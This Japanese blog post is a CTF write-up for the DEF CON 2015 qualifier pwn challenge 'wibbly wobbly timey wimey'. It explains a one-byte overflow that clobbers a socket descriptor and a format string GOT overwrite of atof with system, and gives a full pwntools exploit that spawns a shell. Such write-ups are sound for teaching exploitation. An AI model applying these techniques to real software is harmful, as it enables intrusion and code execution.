---
layout: post
alias: "/blog/2016/02/12/defcon-qualifier-ctf-2015-wibbly-wobbly-timey-wimey/"
title: "DEF CON Qualifier 2015: wibbly wobbly timey wimey"
date: 2016-02-12T23:53:24+09:00
tags: [ "ctf", "writeup", "pwn", "defcon", "format-string-attack", "buffer-overflow", "position-independent-executable" ]
---

友人らとのpwn解く会で<del>解いた</del>解けてなかった[^6]。分からなかったのでwriteup[^1]を見ました。

## [wibbly wobbly timey wimey](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/wibbly-wobbly-timey-wimey)

### 準備

実行すると単純なゲームが始まるバイナリ。`file`すると`shared object`だと言われるのが印象的。

``` sh
$ file wwtw
wwtw: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=0c5fe6964f6e75a50221016235fc68a869c5cf50, stripped
$ checksec --file wwtw
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   wwtw
```

shared objectなのでposition independentjなcodeになっている。
というよりposition independentなexecutableとshared objectは基本的に同じであるらしい[^2]。

また、`$ebx`レジスタがgotの目的で使われている[^3][^4]。
`mov ebx, [esp] ; ret`するだけの関数を呼び出しすことで`mov ebx, eip`のような処理をし、ここに適当な値を足してgot tableの位置を`$ebx`に持たせている。加えて関数の冒頭と末尾で`$ebx`をstackに退避/復帰させている(`$ebp`のように)。
objdumpだと上手く処理してくれない。

### 解法

プログラムは以下の4段階に分けられる。

1.  tardisを目指して移動するゲーム
2.  tardis keyの入力
3.  tardis consoleの起動
4.  転移先座標の入力

#### 1

ゲームはやるだけである。
ゴールに近付きかつ敵が居ない場所へ移動する感じで適当にすればよい。
偶に失敗するかもしれないが気にする必要はない。

#### 2

tardis keyは固定なのでこれもすぐ。
gdbを使えば手に入る。
1文字ずつ判定し違ったらその場で落ちる仕様なので、無理矢理前から1文字ずつ確定させていくこともできる。

#### 3

consoleの起動にはbuffer overflowの脆弱性を利用する。`Selection: `に対する入力で、直前で`bzero(buf, 8)`しているのに`read(STDIN_FILENO, buf, 9)`している。これは別の箇所で用いられているsocketのfile descriptorの下位1byteを上書きする[^5]。

上書きされるfile descriptorであるが、`alarm`を使って2秒ごとに、ここから4byte読み現在時間を表す変数に書き込む。`1. Turn on the console`を選択した際、この値を見て`0x55592b6c < t <= 0x55592b7f`であればconsoleが起動する。

よって`1AAAAAAA\x00`のような入力を送りsocketのfdを`0`にし、範囲内の`0x55592b6d`などの値を送り時間を調整し、再度`1\n`を送ればconsoleが有効化される。有効化した後はfdを戻しておくとよい。

#### 4

最後は単純なformat文字列攻撃である。
特定の座標を入力すると`occupied by another TARDIS`と言われる。このときformat文字列攻撃が可能である。
この座標はgdbで追えば分かる。

攻撃は教科書通りである。
gotが書き込み可能であるので、`atof`を`system`に書き換え`,/bin/sh`を送るとよい。

### 実装

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import time
import operator
import string

def recv_header(p):
    p.recvline()
    p.recvline()
    p.recvline()

def solve_game(p):
    wasd_to_yx = { 'w': (-1,0), 'a': (0,-1), 's': (1,0), 'd': (0,1) }
    fadd = lambda p, q: map(operator.add, p, q)
    fsub = lambda p, q: map(operator.sub, p, q)
    on_field = lambda p, field: 0 <= p[0] < len(field) and 0 <= p[1] < len(field[p[0]])
    while True:
        s = p.recvn(528)
        field = map(lambda t: t[3:], s.splitlines()[1:-1])
        you = None
        goal = None
        for y in range(len(field)):
            for x in range(len(field[y])):
                if field[y][x] in '^V<>':
                    you = (y, x)
                elif field[y][x] in 'ET':
                    goal = (y, x)
        acts = []
        for c in 'wasd':
            nyou = fadd(you, wasd_to_yx[c])
            try:
                if on_field(nyou, field) and field[nyou[0]][nyou[1]] != 'A':
                    dist = sum(map(abs, fsub(nyou, goal)))
                    acts.append((c, dist))
            except IndexError:
                pass
        acts.sort(key=lambda x: x[1])
        p.sendline(acts[0][0])
        if acts[0][1] == 0: # reaches the goal
            s = p.recvn(6)
            if s == 'TARDIS':
                p.recvuntil(': ')
                break
            else:
                p.recvline()

def crack_tardis_key():
    return 'UeSlhCAGEp' # by gdb or bruteforce
    key = ''
    while True:
        for c in '\x04' + string.ascii_letters:
            while True:
                p = process('./wwtw')
                try:
                    recv_header(p)
                    solve_game(p)
                except:
                    p.close()
                    continue
                else:
                    break
            p.send(key + c)
            can_recv = p.can_recv(timeout=0.1)
            p.close()
            if not can_recv:
                if c == '\x04':
                    return key
                key += c
                print key
                break

tardis_key = crack_tardis_key()

def activate_tardis(p):
    p.recvuntil('Selection: ')
    p.send('1AAAAAAA\x00')
    p.recvuntil('Selection: ')
    time.sleep(2.1)
    p.send(p32(0x55592B6C + 1))
    p.send('1AAAAAAA\x03')
    p.recvuntil('Selection: ')
    p.sendline('3')

atof_got = 0x5080 # $ objdump -R wwtw | grep '\<atof\>'
# addresses of local libc
atof_offset   = 0x2d310 # $ readelf -s /usr/lib32/libc.so.6 | grep '\<atof\>'
system_offset = 0x3aeb0 # $ readelf -s /usr/lib32/libc.so.6 | grep '\<system\>'

def format_string_attack(p):
    another_tardis = '51.49213699999999960,-0.1928779999999999939' # by gdb

    p.recvuntil('Coordinates: ')
    p.sendline(another_tardis + ' %274$p %275$p')
    p.recvline()
    resp = p.recvline().split()
    _   = int(resp[2], 16) # saved ebp of     sub <+0x1027>
    ret = int(resp[3], 16) # return addr from sub <+0x1027>
    bin_base = ret - 0x1491

    def fill_spaces(payload):
        payload += ' '
        payload += ' ' * ((len(payload) + 3) // 4 * 4)
        index = 15 + len(payload) // 4 # %15$p is the beggning of payload
        return payload, index
    def write_char(b, c, ix):
        l = (ord(c) - b) % 256
        if l < 10:
            l += 256
        return '%{}d%{}$hhn'.format(l, ix)

    payload, ix = fill_spaces(another_tardis)
    payload += p32(bin_base + atof_got)
    payload += ' '
    ofs = len('Coordinate ') + len(payload)
    payload += '%{}$s'.format(ix)
    p.recvuntil('Coordinates: ')
    p.sendline(payload)
    p.recvline()
    resp = p.recvline()
    atof = u32(resp[ofs:ofs+4])
    libc_base = atof - atof_offset

    payload, ix = fill_spaces(another_tardis)
    payload += p32(bin_base + atof_got)
    payload += p32(bin_base + atof_got + 1)
    payload += p32(bin_base + atof_got + 2)
    payload += p32(bin_base + atof_got + 3)
    s = p32(libc_base + system_offset)
    payload += write_char(len(payload), s[0], ix)
    payload += write_char(   ord(s[0]), s[1], ix + 1)
    payload += write_char(   ord(s[1]), s[2], ix + 2)
    payload += write_char(   ord(s[2]), s[3], ix + 3)
    p.recvuntil('Coordinates: ')
    p.sendline(payload)

    p.recvuntil('Coordinates: ')
    p.sendline(',/bin/sh')

p = process('./wwtw')
recv_header(p)
solve_game(p)
p.sendline(tardis_key)
activate_tardis(p)
format_string_attack(p)
p.sendline('ls')
p.interactive()
```

---

[^1]: <http://charo-it.hatenablog.jp/entry/2015/05/19/114004>
[^2]: <http://stackoverflow.com/questions/16302575/distinguish-shared-objects-from-position-independent-executables>
[^3]: <https://ezoeryou.github.io/blog/article/2015-04-16-PIC.html>
[^4]: <http://7shi.hateblo.jp/entry/2013/05/25/103050>
[^5]: 1byte漏らしてるのはすぐに気付けたけど、これがsocketを上書きしてることは気付けませんでした。writeupを見ました。
[^6]: libcはuploadされてないだけで本番は与えられていたのかな、と思っていたけどそうではなかったらしい。

---

-   Thu Feb 18 17:42:57 JST 2016
    -   解けてなかったのでそのことを明記
